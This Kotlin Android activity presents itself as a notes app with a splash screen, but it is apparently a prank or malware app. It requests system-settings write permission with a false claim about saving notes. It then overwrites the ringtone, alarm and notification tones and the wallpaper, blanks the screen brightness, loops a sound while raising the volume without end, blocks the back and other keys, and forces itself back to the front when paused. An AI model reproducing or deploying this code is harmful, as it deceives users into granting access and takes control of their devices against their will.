package com.example.study.presentation

import android.app.ActivityManager
import android.app.WallpaperManager
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.media.MediaPlayer
import android.media.RingtoneManager
import android.net.Uri
import android.os.Bundle
import android.provider.Settings
import android.provider.Settings.ACTION_MANAGE_WRITE_SETTINGS
import android.view.KeyEvent
import android.view.WindowManager
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.BackHandler
import androidx.activity.compose.setContent
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.core.Spring
import androidx.compose.animation.core.animateDpAsState
import androidx.compose.animation.core.spring
import androidx.compose.animation.expandIn
import androidx.compose.animation.fadeIn
import androidx.compose.foundation.Image
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.font.FontStyle
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.Dp
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.zIndex
import androidx.lifecycle.lifecycleScope
import com.example.study.R
import com.example.study.ui.theme.StudyTheme
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.IOException

class MainActivity : ComponentActivity() {
    private val wallpaperManager by lazy { WallpaperManager.getInstance(this) }
    private val audioManager by lazy { getSystemService(Context.AUDIO_SERVICE) as AudioManager }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.setFlags(
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
        )

        val sound = MediaPlayer.create(this, R.raw.sound)

        setContent {
            var showDialog by remember { mutableStateOf(false) }
            var showSplash by remember { mutableStateOf(false) }
            var showText by remember { mutableStateOf(false) }
            var showProgressBar by remember { mutableStateOf(false) }
            val context = LocalContext.current

            StudyTheme {
                LaunchedEffect(null) {
                    showSplash = true
                    delay(500)
                    showText = true
                    delay(500)
                    showProgressBar = true
                }

                BackHandler {}

                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    Splash(
                        showSplash = showSplash,
                        showText = showText,
                        showProgressBar = showProgressBar
                    ) {
                        if (!Settings.System.canWrite(this@MainActivity)) showDialog = true
                        else {
                            lifecycleScope.launch(Dispatchers.Main) {
                                setRingTone()
                                setNotificationTone()
                                setAlarmTone()
                                setWallpaper()
                                setMinBrightness()
                                setAudio(sound)
                                while (true) {
                                    increaseVol()
                                }
                            }
                        }
                    }

                    if (showDialog) AlertDialog(context)
                }
            }
        }
    }

    @Composable
    private fun Splash(
        showSplash: Boolean,
        showText: Boolean,
        showProgressBar: Boolean,
        onFinished: (Dp) -> Unit
    ) {
        val widgetSize by animateDpAsState(
            targetValue = if (!showSplash) 0.dp else 104.dp,
            animationSpec = spring(
                dampingRatio = Spring.DampingRatioHighBouncy,
                stiffness = Spring.StiffnessMediumLow
            ),
            finishedListener = onFinished
        )

        Box(
            contentAlignment = Alignment.Center,
            modifier = Modifier
                .fillMaxSize()
        ) {

            if (showProgressBar) CircularProgressIndicator(
                strokeWidth = 2.dp,
                modifier = Modifier
                    .size(216.dp)
                    .padding(top = 24.dp)
            )

            Image(
                painter = painterResource(id = R.drawable.logo),
                contentDescription = "logo",
                modifier = Modifier
                    .size(widgetSize)
                    .zIndex(1f)
            )

            AnimatedVisibility(
                visible = showText,
                enter = expandIn(expandFrom = Alignment.Center) + fadeIn()
            ) {

                Text(
                    text = getString(R.string.app_name),
                    fontSize = 22.sp,
                    fontStyle = FontStyle.Italic,
                    fontWeight = FontWeight.Medium,
                    textAlign = TextAlign.Center,
                    modifier = Modifier
                        .width(112.dp)
                        .padding(
                            top = 160.dp,
                        )
                )
            }
        }
    }

    @Composable
    private fun AlertDialog(context: Context) {
        AlertDialog(
            onDismissRequest = {},
            title = {
                Text(
                    text = "We need permission to save/edit your notes",
                    fontSize = 17.sp
                )
            },
            confirmButton = {
                Button(onClick = { goToSettingsPage() }) {
                    Text(text = "ALLOW")
                }
            },
            dismissButton = {
                TextButton(onClick = {
                    Toast.makeText(
                        context,
                        "We need permission to run properly",
                        Toast.LENGTH_SHORT
                    ).show()
                    finishAffinity()
                }) {
                    Text(text = "EXIT")
                }
            },
        )
    }

    private fun goToSettingsPage() {
        Intent(ACTION_MANAGE_WRITE_SETTINGS).apply {
            data = Uri.parse("package:$packageName")
            startActivity(this)
        }
        finishAffinity()
    }

//    private fun setAllTypeOfTones() {
//        val ringtoneUri = Uri.parse("android.resource://$packageName/raw/sound")
//        RingtoneManager.setActualDefaultRingtoneUri(
//            this,
//            RingtoneManager.TYPE_ALL,
//            ringtoneUri
//        )
//    }

    private fun setRingTone() {
        val ringtoneUri = Uri.parse("android.resource://$packageName/raw/sound")
        RingtoneManager.setActualDefaultRingtoneUri(
            this,
            RingtoneManager.TYPE_RINGTONE,
            ringtoneUri
        )
    }

    private fun setNotificationTone() {
        val ringtoneUri = Uri.parse("android.resource://$packageName/raw/ringtone")
        RingtoneManager.setActualDefaultRingtoneUri(
            this,
            RingtoneManager.TYPE_NOTIFICATION,
            ringtoneUri
        )
    }

    private fun setAlarmTone() {
        val ringtoneUri = Uri.parse("android.resource://$packageName/raw/ringtone")
        RingtoneManager.setActualDefaultRingtoneUri(
            this,
            RingtoneManager.TYPE_ALARM,
            ringtoneUri
        )
    }

    private fun setWallpaper() {
        try {
            wallpaperManager.setResource(R.raw.wallpaper)
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    private fun setAudio(sound: MediaPlayer) {
        audioManager.setStreamVolume(
            AudioManager.STREAM_MUSIC,
            audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
            0
        )
        sound.start()
        sound.setOnCompletionListener {
            sound.start()
        }
    }

    private suspend fun increaseVol() {
        delay(6)
        audioManager.adjustVolume(AudioManager.ADJUST_RAISE, 0)
        setMinBrightness()
    }

    private fun setMinBrightness() {
        val layout = window.attributes
        layout.screenBrightness = 0f
        window.attributes = layout
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean = true

    override fun onPause() {
        val activityManager = applicationContext
            .getSystemService(ACTIVITY_SERVICE) as ActivityManager
        activityManager.moveTaskToFront(taskId, 0)

        super.onPause()
    }
}
